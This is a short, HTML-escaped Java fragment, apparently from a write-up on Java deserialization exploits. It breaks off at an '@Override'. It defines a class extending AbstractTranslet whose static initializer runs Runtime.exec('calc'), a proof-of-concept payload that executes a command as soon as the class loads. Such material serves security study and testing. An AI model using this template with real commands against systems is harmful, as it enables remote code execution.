public class Test extends AbstractTranslet&amp;#123;
    static &amp;#123;
        try &amp;#123;
            Runtime.getRuntime().exec(&amp;quot;calc&amp;quot;);
        &amp;#125; catch (IOException e) &amp;#123;
            throw new RuntimeException(e);
        &amp;#125;
    &amp;#125;

    @Override
